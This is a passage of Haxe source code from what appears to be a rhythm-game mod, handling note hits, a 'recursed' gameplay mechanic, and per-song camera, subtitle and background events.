						dad.playAnim(dad.animation.getByName("singThrow") == null ? 'singSmash' : 'singThrow', true);
					}
			}
			cameraMoveOnNote(note.originalType, 'bf');
			if (UsingNewCam)
			{
				focusOnDadGlobal = false;
				ZoomCam(false);
			}

			playerStrums.forEach(function(spr:StrumNote)
			{
				if (Math.abs(note.noteData) == spr.ID)
				{
					spr.animation.play('confirm', true);
				}
			});
			if (isRecursed && !note.isSustainNote)
			{
				noteCount++;
				notesLeftText.text = noteCount + '/' + notesLeft;

				if (noteCount >= notesLeft)
				{
					removeRecursed();
				}
			}

			note.wasGoodHit = true;
			vocals.volume = 1;

			note.kill();
			notes.remove(note, true);
			note.destroy();

			updateAccuracy();
		}
	}
	function recursedNoteMiss()
	{
		if (!isRecursed)
		{
			missedRecursedLetterCount++;
			var recursedCover = new FlxSprite().loadGraphic(Paths.image('recursed/recursedX'));
			recursedCover.x = (boyfriend.getGraphicMidpoint().x) + new FlxRandom().float(-recursedCover.width, recursedCover.width);
			recursedCover.y = (boyfriend.getGraphicMidpoint().y) - new FlxRandom().float(-recursedCover.height, recursedCover.height) / 2;

			recursedCover.angle = new FlxRandom().float(0, 180);
			
			recursedCovers.add(recursedCover);
			add(recursedCover);

			FlxG.camera.shake(0.012 * missedRecursedLetterCount, 0.5);
			if (missedRecursedLetterCount > new FlxRandom().int(2, 5))
			{
				turnRecursed();
			}
		}
		else
		{
			FlxG.camera.shake(0.02, 0.5);
			timeLeft -= 5;
		}
	}
	function turnRecursed()
	{
		preRecursedHealth = health;
		isRecursed = true;
		missedRecursedLetterCount = 0;
		for (cover in recursedCovers)
		{
			recursedCovers.remove(cover);
			remove(cover);
		}
		FlxG.camera.flash();
		
		switch (boyfriend.curCharacter)
		{
			case 'bambi-3d':
				health = 0;
				return;
			case 'tristan-golden' | 'tristan-golden-glowing':
				FlxG.sound.play(Paths.sound('recursed/boom', 'shared'), 1.5, false);
				for (i in 0...15)
				{
					var goldenPiece = new FlxSprite(boyfriend.getGraphicMidpoint().x + FlxG.random.int(-200, 100), boyfriend.getGraphicMidpoint().y);
					goldenPiece.frames = Paths.getSparrowAtlas('recursed/gold_pieces_but_not_broken', 'shared');
					goldenPiece.animation.addByPrefix('piece', 'gold piece ${FlxG.random.int(1, 4)}', 0, false);
					goldenPiece.animation.play('piece');
					add(goldenPiece);

					goldenPiece.angularVelocity = 50;
				
					goldenPiece.acceleration.y = 600;
					goldenPiece.velocity.y -= FlxG.random.int(300, 400);
					goldenPiece.velocity.x -= FlxG.random.int(-100, 100);
					goldenPiece.angularAcceleration = 200;

					FlxTween.tween(goldenPiece, {alpha: 0}, 2, {onComplete: function(tween:FlxTween)
					{
						remove(goldenPiece);
					}});

					if (boyfriend.curCharacter == 'tristan-golden-glowing') {
						boyfriend.color = nightColor;
					}
				}
		}
		preRecursedSkin = (formoverride != 'none' && boyfriend.curCharacter == formoverride ? formoverride : boyfriend.curCharacter);
		if (boyfriend.skins.exists('recursed'))
		{
			switchBF(boyfriend.skins.get('recursed'), boyfriend.getPosition());
		}
		bfGroup.add(boyfriend);
		addRecursedUI();		
	}
	function addRecursedUI()
	{
		timeGiven = Math.round(new FlxRandom().float(25, 35));
		timeLeft = timeGiven;
		notesLeft = new FlxRandom().int(65, 100);
		noteCount = 0;

		var yOffset = healthBar.y - 50;

		notesLeftText = new FlxText((FlxG.width / 2) - 200, yOffset, 0, noteCount + '/' + notesLeft, 60);
		notesLeftText.setFormat("Comic Sans MS Bold", 30, FlxColor.WHITE, FlxTextAlign.CENTER, FlxTextBorderStyle.OUTLINE, FlxColor.BLACK);
		notesLeftText.scrollFactor.set();
		notesLeftText.borderSize = 2.5;
		notesLeftText.antialiasing = true;
		notesLeftText.cameras = [camHUD];
		add(notesLeftText);
		recursedUI.add(notesLeftText);

		var noteIcon:FlxSprite = new FlxSprite(notesLeftText.x + notesLeftText.width + 10, notesLeftText.y - 15).loadGraphic(Paths.image('recursed/noteIcon', 'shared'));
		noteIcon.scrollFactor.set();
		noteIcon.setGraphicSize(Std.int(noteIcon.width * 0.4));
		noteIcon.updateHitbox();
		noteIcon.cameras = [camHUD];
		add(noteIcon);
		recursedUI.add(noteIcon);

		timeLeftText = new FlxText((FlxG.width / 2) + 100, yOffset, 0, FlxStringUtil.formatTime(timeLeft), 60);
		timeLeftText.setFormat("Comic Sans MS Bold", 30, FlxColor.WHITE, FlxTextAlign.CENTER, FlxTextBorderStyle.OUTLINE, FlxColor.BLACK);
		timeLeftText.scrollFactor.set();
		timeLeftText.borderSize = 2.5;
		timeLeftText.antialiasing = true;
		timeLeftText.cameras = [camHUD];
		add(timeLeftText);
		recursedUI.add(timeLeftText);

		var timerIcon:FlxSprite = new FlxSprite(timeLeftText.x + timeLeftText.width + 20, timeLeftText.y - 7).loadGraphic(Paths.image('recursed/timerIcon', 'shared'));
		timerIcon.scrollFactor.set();
		timerIcon.setGraphicSize(Std.int(timerIcon.width * 0.4));
		timerIcon.updateHitbox();
		timerIcon.cameras = [camHUD];
		add(timerIcon);
		recursedUI.add(timerIcon);

		rotateRecursedCam();
	}
	function removeRecursed()
	{
		FlxG.camera.flash();
		
		cancelRecursedCamTween();

		isRecursed = false;
		for (element in recursedUI)
		{
			recursedUI.remove(element);
			remove(element);
		}
		switchBF(preRecursedSkin, boyfriend.getPosition());
		health = preRecursedHealth;
	}
	function initAlphabet(songList:Array<String>)
	{
		for (letter in alphaCharacters)
		{
			alphaCharacters.remove(letter);
			remove(letter);
		}
		var startWidth = 640;
		var width:Float = startWidth;
		var row:Float = 0;
		
		while (row < FlxG.height)
		{
			while (width < FlxG.width * 2.5)
			{
				for (i in 0...songList.length)
				{
					var curSong = songList[i];
					var song = new Alphabet(0, 0, curSong, true);
					song.x = width;
					song.y = row;

					width += song.width + 20;
					alphaCharacters.add(song);
					add(song);
					
					if (width > FlxG.width * 2.5)
					{
						break;
					}
				}
			}
			row += 120;
			width = startWidth;
		}
		for (char in alphaCharacters)
		{
			for (letter in char.characters)
			{
				letter.alpha = 0;
			}
		}
		for (char in alphaCharacters)
		{
			char.unlockY = true;
			for (alphaChar in char.characters)
			{
				alphaChar.velocity.set(new FlxRandom().float(-50, 50), new FlxRandom().float(-50, 50));
				alphaChar.angularVelocity = new FlxRandom().int(30, 50);

				alphaChar.setPosition(new FlxRandom().float(-FlxG.width / 2, FlxG.width * 2.5), new FlxRandom().float(0, FlxG.height * 2.5));
			}
		}
	}
	function rotateRecursedCam()
	{
		rotatingCamTween = FlxTween.tween(FlxG.camera, {angle: 8}, 5, {onComplete: function(tween:FlxTween)
		{
			FlxTween.tween(FlxG.camera, {angle: -8}, 5);
		}, type: FlxTweenType.ONESHOT, ease: FlxEase.backOut});
	}
	function cancelRecursedCamTween()
	{
		if (rotatingCamTween != null)
		{
			rotatingCamTween.cancel();
			rotatingCamTween = null;
	
			camRotateAngle = 0;
			
			FlxG.camera.angle = 0;
			camHUD.angle = 0;
		}
	}
	function cinematicBars(time:Float, closeness:Float)
	{
		var upBar = new FlxSprite().makeGraphic(Std.int(FlxG.width * ((1 / defaultCamZoom) * 2)), Std.int(FlxG.height / 2), FlxColor.BLACK);
		var downBar = new FlxSprite().makeGraphic(Std.int(FlxG.width * ((1 / defaultCamZoom) * 2)), Std.int(FlxG.height / 2), FlxColor.BLACK);

		upBar.screenCenter();
		downBar.screenCenter();
		upBar.scrollFactor.set();
		downBar.scrollFactor.set();
		upBar.cameras = [camHUD];
		downBar.cameras = [camHUD];

		upBar.y -= 2000;
		downBar.y += 2000;

		add(upBar);
		add(downBar);
		
		FlxTween.tween(upBar, {y: (FlxG.height - upBar.height) / 2 - closeness}, (Conductor.crochet / 1000) / 2, {ease: FlxEase.expoInOut, onComplete: function(tween:FlxTween)
		{
			new FlxTimer().start(time, function(timer:FlxTimer)
			{
				FlxTween.tween(upBar, {y: upBar.y - 2000}, (Conductor.crochet / 1000) / 2, {ease: FlxEase.expoIn, onComplete: function(tween:FlxTween)
				{
					remove(upBar);
				}});
			});
		}});
		FlxTween.tween(downBar, {y: (FlxG.height - downBar.height) / 2 + closeness}, (Conductor.crochet / 1000) / 2, {ease: FlxEase.expoInOut, onComplete: function(tween:FlxTween)
		{
			new FlxTimer().start(time, function(timer:FlxTimer)
			{
				FlxTween.tween(downBar, {y: downBar.y + 2000}, (Conductor.crochet / 1000) / 2, {ease: FlxEase.expoIn, onComplete: function(tween:FlxTween)
				{
					remove(downBar);
				}});
			});
		}});
	}
	function swapGlitch(glitchTime:Float, toBackground:String)
	{
		//hey t5 if you make the static fade in and out, can you use the sounds i made? they are in preload
		var glitch = new BGSprite('glitch', 0, 0, 'ui/glitch/glitchSwitch', 
		[
			new Animation('glitch', 'glitchScreen', 24, true, [false, false])
		], 0, 0, false, true);
		glitch.scrollFactor.set();
		glitch.cameras = [camHUD];
		glitch.setGraphicSize(FlxG.width, FlxG.height);
		glitch.updateHitbox();
		glitch.screenCenter();
		if (FlxG.save.data.eyesores)
		{
			glitch.animation.play('glitch');
		}
		add(glitch);

		new FlxTimer().start(glitchTime, function(timer:FlxTimer)
		{
			expungedBG.setPosition(0, 200);
			switch (toBackground)
			{
				case 'expunged':
					expungedBG.loadGraphic(Paths.image('backgrounds/void/exploit/creepyRoom', 'shared'));
					expungedBG.setGraphicSize(Std.int(expungedBG.width * 2));
				case 'cheating':
					expungedBG.loadGraphic(Paths.image('backgrounds/void/exploit/cheater GLITCH'));
					expungedBG.setGraphicSize(Std.int(expungedBG.width * 3));
				case 'cheating-2':
					expungedBG.loadGraphic(Paths.image('backgrounds/void/exploit/glitchy_cheating_2'));
					expungedBG.setGraphicSize(Std.int(expungedBG.width * 3));
				case 'unfair':
					expungedBG.loadGraphic(Paths.image('backgrounds/void/exploit/glitchyUnfairBG'));
					expungedBG.setGraphicSize(Std.int(expungedBG.width * 3));
				case 'chains':
					expungedBG.setPosition(-300, 0);
					expungedBG.loadGraphic(Paths.image('backgrounds/void/exploit/expunged_chains'));
					expungedBG.setGraphicSize(Std.int(expungedBG.width * 2));
			}
			remove(glitch);
		});
	}
	var black:FlxSprite;

	override function stepHit()
	{
		super.stepHit();
		if (FlxG.sound.music.time > Conductor.songPosition + 20 || FlxG.sound.music.time < Conductor.songPosition - 20)
			resyncVocals();

		switch (SONG.song.toLowerCase())
		{
			case 'blocked':
				switch (curStep)
				{
					case 128:
						defaultCamZoom += 0.1;
						FlxG.camera.flash(FlxColor.WHITE, 0.5);
						black = new FlxSprite().makeGraphic(FlxG.width * 2, FlxG.height * 2, FlxColor.BLACK);
						black.screenCenter();
						black.alpha = 0;
						add(black);
						FlxTween.tween(black, {alpha: 0.6}, 1);
						makeInvisibleNotes(true);
						subtitleManager.addSubtitle(LanguageManager.getTextString('blocked_sub1'), 0.02, 1);
					case 165:
						subtitleManager.addSubtitle(LanguageManager.getTextString('blocked_sub2'), 0.02, 1);
					case 188:
						subtitleManager.addSubtitle(LanguageManager.getTextString('blocked_sub3'), 0.02, 1);
					case 224:
						subtitleManager.addSubtitle(LanguageManager.getTextString('blocked_sub4'), 0.02, 1);
					case 248:
						subtitleManager.addSubtitle(LanguageManager.getTextString('blocked_sub5'), 0.02, 0.5, {subtitleSize: 60});
					case 256:
						defaultCamZoom -= 0.1;
						FlxG.camera.flash();
						FlxTween.tween(black, {alpha: 0}, 1);
						makeInvisibleNotes(false);
					case 640:
						FlxG.camera.flash();
						black.alpha = 0.6;
						defaultCamZoom += 0.1;
					case 768:
						FlxG.camera.flash();
						defaultCamZoom -= 0.1;
						black.alpha = 0;
					case 1028:
						makeInvisibleNotes(true);
						subtitleManager.addSubtitle(LanguageManager.getTextString('blocked_sub6'), 0.02, 1.5);
					case 1056:
						subtitleManager.addSubtitle(LanguageManager.getTextString('blocked_sub7'), 0.02, 1);
					case 1084:
						subtitleManager.addSubtitle(LanguageManager.getTextString('blocked_sub8'), 0.02, 1);
					case 1104:
						subtitleManager.addSubtitle(LanguageManager.getTextString('blocked_sub9'), 0.02, 1);
					case 1118:
						subtitleManager.addSubtitle(LanguageManager.getTextString('blocked_sub10'), 0.02, 1);
					case 1143:
						subtitleManager.addSubtitle(LanguageManager.getTextString('blocked_sub11'), 0.02, 1, {subtitleSize: 45});
						makeInvisibleNotes(false);
					case 1152:
						FlxTween.tween(black, {alpha: 0.4}, 1);
						defaultCamZoom += 0.3;
					case 1200:
						#if SHADERS_ENABLED
						if(CompatTool.save.data.compatMode != null && CompatTool.save.data.compatMode == false)
							{
								camHUD.setFilters([new ShaderFilter(blockedShader.shader)]);
							}
						#end
						FlxTween.tween(black, {alpha: 0.7}, (Conductor.stepCrochet / 1000) * 8);
					case 1216:
						FlxG.camera.flash(FlxColor.WHITE, 0.5);
						camHUD.setFilters([]);
						remove(black);
						defaultCamZoom -= 0.3;
				}
			case 'corn-theft':
				switch (curStep)
				{
					case 668:
						defaultCamZoom += 0.1;
					case 784:
						defaultCamZoom += 0.1;
					case 848:
						defaultCamZoom -= 0.2;
					case 916:
						FlxG.camera.flash();
					case 935:
						defaultCamZoom += 0.2;
						black = new FlxSprite().makeGraphic(FlxG.width * 2, FlxG.height * 2, FlxColor.BLACK);
						black.screenCenter();
						black.alpha = 0;
						add(black);
						FlxTween.tween(black, {alpha: 0.6}, 1);
						makeInvisibleNotes(true);
						subtitleManager.addSubtitle(LanguageManager.getTextString('ctheft_sub1'), 0.02, 1);
					case 945:
						subtitleManager.addSubtitle(LanguageManager.getTextString('ctheft_sub2'), 0.02, 1);
					case 976:
						subtitleManager.addSubtitle(LanguageManager.getTextString('ctheft_sub3'), 0.02, 0.5);
					case 982:
						subtitleManager.addSubtitle(LanguageManager.getTextString('ctheft_sub4'), 0.02, 1);
					case 992:
						subtitleManager.addSubtitle(LanguageManager.getTextString('ctheft_sub5'), 0.02, 1);
					case 1002:
						subtitleManager.addSubtitle(LanguageManager.getTextString('ctheft_sub6'), 0.02, 0.3);
					case 1007:
						subtitleManager.addSubtitle(LanguageManager.getTextString('ctheft_sub7'), 0.02, 0.3);
					case 1033:
						subtitleManager.addSubtitle("Bye Baa!", 0.02, 0.3, {subtitleSize: 45});
						FlxTween.tween(dad, {alpha: 0}, (Conductor.stepCrochet / 1000) * 6);
						FlxTween.tween(black, {alpha: 0}, (Conductor.stepCrochet / 1000) * 6);
						FlxTween.num(defaultCamZoom, defaultCamZoom + 0.2, (Conductor.stepCrochet / 1000) * 6, {}, function(newValue:Float)
						{
							defaultCamZoom = newValue;
						});
						makeInvisibleNotes(false);
					case 1040:
						defaultCamZoom = 0.8; 
						dad.alpha = 1;
						remove(black);
						FlxG.camera.flash();
				}
			case 'maze':
				switch (curStep)
				{
					case 466:
						defaultCamZoom += 0.2;
						FlxG.camera.flash(FlxColor.WHITE, 0.5);
						black = new FlxSprite().makeGraphic(FlxG.width * 2, FlxG.height * 2, FlxColor.BLACK);
						black.screenCenter();
						black.alpha = 0;
						add(black);
						FlxTween.tween(black, {alpha: 0.6}, 1);
						makeInvisibleNotes(true);
						subtitleManager.addSubtitle(LanguageManager.getTextString('maze_sub1'), 0.02, 1);
					case 476:
						subtitleManager.addSubtitle(LanguageManager.getTextString('maze_sub2'), 0.02, 0.7);
					case 484:
						subtitleManager.addSubtitle(LanguageManager.getTextString('maze_sub3'), 0.02, 1);
					case 498:
						subtitleManager.addSubtitle(LanguageManager.getTextString('maze_sub4'), 0.02, 1);
					case 510:
						subtitleManager.addSubtitle(LanguageManager.getTextString('maze_sub5'), 0.02, 1, {subtitleSize: 60});
						makeInvisibleNotes(false);
					case 528:
						 defaultCamZoom = 0.8;
						black.alpha = 0;
						FlxG.camera.flash();
					case 832:
						defaultCamZoom += 0.2;
						FlxTween.tween(black, {alpha: 0.4}, 1);
					case 838:
						makeInvisibleNotes(true);
						subtitleManager.addSubtitle(LanguageManager.getTextString('maze_sub6'), 0.02, 1);
					case 847:
						subtitleManager.addSubtitle(LanguageManager.getTextString('maze_sub7'), 0.02, 0.5);
					case 856:
						subtitleManager.addSubtitle(LanguageManager.getTextString('maze_sub8'), 0.02, 1);
					case 867:
						subtitleManager.addSubtitle(LanguageManager.getTextString('maze_sub9'), 0.02, 1, {subtitleSize: 40});
					case 879:
						subtitleManager.addSubtitle(LanguageManager.getTextString('maze_sub10'), 0.02, 1);
					case 890:
						subtitleManager.addSubtitle(LanguageManager.getTextString('maze_sub11'), 0.02, 1);
					case 902:
						subtitleManager.addSubtitle(LanguageManager.getTextString('maze_sub12'), 0.02, 1, {subtitleSize: 60});
						makeInvisibleNotes(false);
					case 908:
						FlxTween.tween(black, {alpha: 1}, (Conductor.stepCrochet / 1000) * 4);
					case 912:
						if (!spotLightPart)
						{
							spotLightPart = true;
							defaultCamZoom -= 0.1;
							FlxG.camera.flash(FlxColor.WHITE, 0.5);
	
							spotLight = new FlxSprite().loadGraphic(Paths.image('spotLight'));
							spotLight.blend = BlendMode.ADD;
							spotLight.setGraphicSize(Std.int(spotLight.width * (dad.frameWidth / spotLight.width) * spotLightScaler));
							spotLight.updateHitbox();
							spotLight.alpha = 0;
							spotLight.origin.set(spotLight.origin.x, spotLight.origin.y - (spotLight.frameHeight / 2));
							add(spotLight);
	
							spotLight.setPosition(dad.getGraphicMidpoint().x - (spotLight.width / 2), dad.getGraphicMidpoint().y - (spotLight.height / 2));
							updateSpotlight(false);
							
							FlxTween.tween(black, {alpha: 0.6}, 1);
							FlxTween.tween(spotLight, {alpha: 1}, 1);
						}
					case 1168:
						spotLightPart = false;
						FlxTween.tween(spotLight, {alpha: 0}, 1, {onComplete: function(tween:FlxTween)
						{
							remove(spotLight);
						}});
						FlxTween.tween(black, {alpha: 0}, 1);
					case 1232:
						FlxG.camera.flash();
				}
			case 'greetings':
				switch (curStep)
				{
					case 492:
						var curZoom = defaultCamZoom;
						var time = (Conductor.stepCrochet / 1000) * 20;
						FlxG.camera.fade(FlxColor.WHITE, time, false, function()
						{
							FlxG.camera.fade(FlxColor.WHITE, 0, true, function()
							{
								FlxG.camera.flash(FlxColor.WHITE, 0.5);
							});
						});
						FlxTween.num(curZoom, curZoom + 0.4, time, {onComplete: function(tween:FlxTween)
						{
							defaultCamZoom = 0.7;
						}}, function(newValue:Float)
						{
							defaultCamZoom = newValue;
						});
				}
			case 'recursed':
				switch (curStep)
				{
					case 320:
						defaultCamZoom = 0.6;
						cinematicBars(((Conductor.stepCrochet * 30) / 1000), 400);
					case 352:
						defaultCamZoom = 0.4;
						FlxG.camera.flash();
					case 864:
						FlxG.camera.flash();
						charBackdrop.loadGraphic(Paths.image('recursed/bambiScroll'));
						freeplayBG.loadGraphic(bambiBG);
						freeplayBG.color = FlxColor.multiply(0xFF00B515, FlxColor.fromRGB(44, 44, 44));
						initAlphabet(bambiSongs);
					case 1248:
						defaultCamZoom = 0.6;
						FlxG.camera.flash();
						charBackdrop.loadGraphic(Paths.image('recursed/tristanScroll'));
						freeplayBG.loadGraphic(tristanBG);
						freeplayBG.color = FlxColor.multiply(0xFFFF0000, FlxColor.fromRGB(44, 44, 44));
						initAlphabet(tristanSongs);
					case 1632:
						defaultCamZoom = 0.4;
						FlxG.camera.flash();
				}
			case 'splitathon':
				switch (curStep)
				{
					case 4750:
						dad.canDance = false;
						dad.playAnim('scared', true);
						camHUD.shake(0.015, (Conductor.stepCrochet / 1000) * 50);
					case 4800:
						FlxG.camera.flash(FlxColor.WHITE, 1);
						splitathonExpression('dave', 'what');
						addSplitathonChar("bambi-splitathon");
						if (!hasTriggeredDumbshit)
						{
							throwThatBitchInThere('bambi-splitathon', 'dave-splitathon');
						}
					case 5824:
						FlxG.camera.flash(FlxColor.WHITE, 1);
						splitathonExpression('bambi', 'umWhatIsHappening');
						addSplitathonChar("dave-splitathon");
					case 6080:
						FlxG.camera.flash(FlxColor.WHITE, 1);
						splitathonExpression('dave', 'happy'); 
						addSplitathonChar("bambi-splitathon");
					case 8384:
						FlxG.camera.flash(FlxColor.WHITE, 1);
						splitathonExpression('bambi', 'yummyCornLol');
						addSplitathonChar("dave-splitathon");
					case 4799 | 5823 | 6079 | 8383:
						hasTriggeredDumbshit = false;
						updatevels = false;
				}

			case 'insanity':
				switch (curStep)
				{
					case 384 | 1040:
						defaultCamZoom = 0.9;
					case 448 | 1056:
						defaultCamZoom = 0.8;
					case 512 | 768:
						defaultCamZoom = 1;
					case 640:
						defaultCamZoom = 1.1;
					case 660 | 680:
						FlxG.sound.play(Paths.sound('static'), 0.1);
						dad.visible = false;
						dadmirror.visible = true;
						curbg.visible = true;
						iconP2.changeIcon(dadmirror.curCharacter);
					case 664 | 684:
						dad.visible = true;
						dadmirror.visible = false;
						curbg.visible = false;
						iconP2.changeIcon(dad.curCharacter);
					case 708:
						defaultCamZoom = 0.8;
						dad.playAnim('um', true);

					case 1176:
						FlxG.sound.play(Paths.sound('static'), 0.1);
						dad.visible = false;
						dadmirror.visible = true;
						curbg.loadGraphic(Paths.image('backgrounds/void/redsky', 'shared'));
						curbg.alpha = 1;
						curbg.visible = true;
						iconP2.changeIcon(dadmirror.curCharacter);
					case 1180:
						dad.visible = true;
						dadmirror.visible = false;
						iconP2.changeIcon(dad.curCharacter);
						dad.canDance = false;
						dad.animation.play('scared', true);
				}
			case 'interdimensional':
				switch(curStep)
				{
					case 378:
						FlxG.camera.fade(FlxColor.WHITE, 0.3, false);
					case 384:
						black = new FlxSprite(0,0).makeGraphic(2560, 1440, FlxColor.BLACK);
						black.screenCenter();
						black.scrollFactor.set();
						black.alpha = 0.4;
						add(black);
						defaultCamZoom += 0.2;
						FlxG.camera.fade(FlxColor.WHITE, 0.5, true);
					case 512:
						defaultCamZoom -= 0.1;
					case 639:
						FlxG.camera.flash(FlxColor.WHITE, 0.3, false);
						defaultCamZoom -= 0.1; // pooop
						FlxTween.tween(black, {alpha: 0}, 0.5, 
						{
							onComplete: function(tween:FlxTween)
							{
								remove(black);
							}
						});
						changeInterdimensionBg('spike-void');
					case 1152:
						FlxG.camera.flash(FlxColor.WHITE, 0.3, false);
						changeInterdimensionBg('darkSpace');
						
						tweenList.push(FlxTween.color(gf, 1, gf.color, FlxColor.BLUE));
						tweenList.push(FlxTween.color(dad, 1, dad.color, FlxColor.BLUE));
						bfTween = FlxTween.color(boyfriend, 1, boyfriend.color, FlxColor.BLUE);
						flyingBgChars.forEach(function(char:FlyingBGChar)
						{
							tweenList.push(FlxTween.color(char, 1, char.color, FlxColor.BLUE));
						});
					case 1408:
						FlxG.camera.flash(FlxColor.WHITE, 0.3, false);
						changeInterdimensionBg('hexagon-void');

						tweenList.push(FlxTween.color(dad, 1, dad.color, FlxColor.WHITE));
						bfTween = FlxTween.color(boyfriend, 1, boyfriend.color, FlxColor.WHITE);
						tweenList.push(FlxTween.color(gf, 1, gf.color, FlxColor.WHITE));
						flyingBgChars.forEach(function(char:FlyingBGChar)
						{
							tweenList.push(FlxTween.color(char, 1, char.color, FlxColor.WHITE));
						});
					case 1792:
						FlxG.camera.flash(FlxColor.WHITE, 0.3, false);
						changeInterdimensionBg('nimbi-void');
					case 2176:
						FlxG.camera.flash(FlxColor.WHITE, 0.3, false);
						changeInterdimensionBg('interdimension-void');
					case 2688:
						defaultCamZoom = 0.7;
						for (bgSprite in backgroundSprites)
						{
							FlxTween.tween(bgSprite, {alpha: 0}, 1);
						}
						for (bgSprite in revertedBG)
						{
							FlxTween.tween(bgSprite, {alpha: 1}, 1);
						}

						canFloat = false;
						FlxG.camera.flash(FlxColor.WHITE, 0.25);
						switchDad('dave-festival', dad.getPosition(), false);

						regenerateStaticArrows(0);
						
						var color = getBackgroundColor(curStage);

						FlxTween.color(dad, 0.6, dad.color, color);
						if (formoverride != 'tristan-golden-glowing')
						{
							FlxTween.color(boyfriend, 0.6, boyfriend.color, color);
						}
						FlxTween.color(gf, 0.6, gf.color, color);

						FlxTween.linearMotion(dad, dad.x, dad.y, 100 + dad.globalOffset[0], 450 + dad.globalOffset[1], 0.6, true);
						
						for (char in [boyfriend, gf])
						{
							if (char.animation.curAnim != null && char.animation.curAnim.name.startsWith('sing') && !char.animation.curAnim.finished)
							{
								char.animation.finishCallback = function(animation:String)
								{
									char.canDance = false;
									char == boyfriend ? char.playAnim('hey', true) : char.playAnim('cheer', true);
								}
							}
							else
							{
								char.canDance = false;
								char == boyfriend ? char.playAnim('hey', true) : char.playAnim('cheer', true);
							}
						}
				}

			case 'unfairness':
				switch(curStep)
				{
					case 256:
						defaultCamZoom += 0.2;
						black = new FlxSprite().makeGraphic(FlxG.width * 2, FlxG.height * 2, FlxColor.BLACK);
						black.screenCenter();
						black.alpha = 0;
						add(black);
						FlxTween.tween(black, {alpha: 0.6}, 1);
						makeInvisibleNotes(true);
					case 261:
						subtitleManager.addSubtitle(LanguageManager.getTextString('unfairness_sub1'), 0.02, 0.6);
					case 284:
					    subtitleManager.addSubtitle(LanguageManager.getTextString('unfairness_sub2'), 0.02, 0.6);
					case 321:
						subtitleManager.addSubtitle(LanguageManager.getTextString('unfairness_sub3'), 0.02, 0.6);
					case 353:
						subtitleManager.addSubtitle(LanguageManager.getTextString('unfairness_sub4'), 0.02, 1.5);
					case 414:
						subtitleManager.addSubtitle(LanguageManager.getTextString('unfairness_sub5'), 0.02, 0.6);
					case 439:
						subtitleManager.addSubtitle(LanguageManager.getTextString('unfairness_sub6'), 0.02, 1);
					case 468:
						subtitleManager.addSubtitle(LanguageManager.getTextString('unfairness_sub7'), 0.02, 1);
					case 512:
						defaultCamZoom -= 0.2;
						FlxTween.tween(black, {alpha: 0}, 1);
						makeInvisibleNotes(false);
					case 2560:
						dadStrums.forEach(function(spr:StrumNote)
						{
							FlxTween.tween(spr, {alpha: 0}, 6);
						});
					case 2688:
						playerStrums.forEach(function(spr:StrumNote)
						{
							FlxTween.tween(spr, {alpha: 0}, 6);
						});
					case 3072:
						FlxG.camera.flash(FlxColor.WHITE, 1);
						dad.visible = false;
						iconP2.visible = false;
				}
				case 'cheating':
					switch(curStep)
					{
						case 512:
							defaultCamZoom += 0.2;
							black = new FlxSprite().makeGraphic(FlxG.width * 2, FlxG.height * 2, FlxColor.BLACK);
							black.screenCenter();
							black.alpha = 0;
							add(black);
							FlxTween.tween(black, {alpha: 0.6}, 1);
							makeInvisibleNotes(true);
							subtitleManager.addSubtitle(LanguageManager.getTextString('cheating_sub1'), 0.02, 0.6);
						case 537:
							subtitleManager.addSubtitle(LanguageManager.getTextString('cheating_sub2'), 0.02, 0.6);
						case 552:
							subtitleManager.addSubtitle(LanguageManager.getTextString('cheating_sub3'), 0.02, 0.6);
						case 570:
							subtitleManager.addSubtitle(LanguageManager.getTextString('cheating_sub4'), 0.02, 1);
						case 595:
							subtitleManager.addSubtitle(LanguageManager.getTextString('cheating_sub5'), 0.02, 0.6);
						case 607:
							subtitleManager.addSubtitle(LanguageManager.getTextString('cheating_sub6'), 0.02, 0.6);
						case 619:
							subtitleManager.addSubtitle(LanguageManager.getTextString('cheating_sub7'), 0.02, 1);
						case 640:
							subtitleManager.addSubtitle(LanguageManager.getTextString('cheating_sub8'), 0.02, 0.6);
						case 649:
							subtitleManager.addSubtitle(LanguageManager.getTextString('cheating_sub9'), 0.02, 0.6);
						case 654:
							subtitleManager.addSubtitle(LanguageManager.getTextString('cheating_sub10'), 0.02, 0.6);
						case 666:
							subtitleManager.addSubtitle(LanguageManager.getTextString('cheating_sub11'), 0.02, 0.6);
						case 675:
							subtitleManager.addSubtitle(LanguageManager.getTextString('cheating_sub12'), 0.02, 0.6);
						case 685:
							subtitleManager.addSubtitle(LanguageManager.getTextString('cheating_sub13'), 0.02, 0.6);
						case 695:
							subtitleManager.addSubtitle(LanguageManager.getTextString('cheating_sub14'), 0.02, 0.6);
						case 712:
							subtitleManager.addSubtitle(LanguageManager.getTextString('cheating_sub15'), 0.02, 0.6);
						case 715:
							subtitleManager.addSubtitle(LanguageManager.getTextString('cheating_sub16'), 0.02, 0.6);
						case 722:
							subtitleManager.addSubtitle(LanguageManager.getTextString('cheating_sub17'), 0.02, 0.6);
						case 745:
							subtitleManager.addSubtitle(LanguageManager.getTextString('cheating_sub18'), 0.02, 0.3);
						case 749:
							subtitleManager.addSubtitle(LanguageManager.getTextString('cheating_sub19'), 0.02, 0.3);
						case 756:
							subtitleManager.addSubtitle(LanguageManager.getTextString('cheating_sub20'), 0.02, 0.6);
						case 768:
							defaultCamZoom -= 0.2;
							FlxTween.tween(black, {alpha: 0}, 1);
							makeInvisibleNotes(false);
						case 1280:
							defaultCamZoom += 0.2;
							black = new FlxSprite().makeGraphic(FlxG.width * 2, FlxG.height * 2, FlxColor.BLACK);
							black.screenCenter();
							black.alpha = 0;
							add(black);
							FlxTween.tween(black, {alpha: 0.6}, 1);
						case 1301:
							subtitleManager.addSubtitle(LanguageManager.getTextString('cheating_sub21'), 0.02, 0.6);
						case 1316:
							subtitleManager.addSubtitle(LanguageManager.getTextString('cheating_sub22'), 0.02, 0.6);
						case 1344:
							subtitleManager.addSubtitle(LanguageManager.getTextString('cheating_sub23'), 0.02, 0.6);
						case 1374:
							subtitleManager.addSubtitle(LanguageManager.getTextString('cheating_sub24'), 0.02, 1);
						case 1394:
							subtitleManager.addSubtitle(LanguageManager.getTextString('cheating_sub25'), 0.02, 0.5);
						case 1403:
							subtitleManager.addSubtitle(LanguageManager.getTextString('cheating_sub26'), 0.02, 1);
						case 1429:
							subtitleManager.addSubtitle(LanguageManager.getTextString('cheating_sub27'), 0.02, 0.6);
						case 1475:
							subtitleManager.addSubtitle(LanguageManager.getTextString('cheating_sub28'), 0.02, 1.5);
						case 1504:
							subtitleManager.addSubtitle(LanguageManager.getTextString('cheating_sub29'), 0.02, 1);
						case 1528:
							subtitleManager.addSubtitle(LanguageManager.getTextString('cheating_sub30'), 0.02, 0.6);
						case 1536:
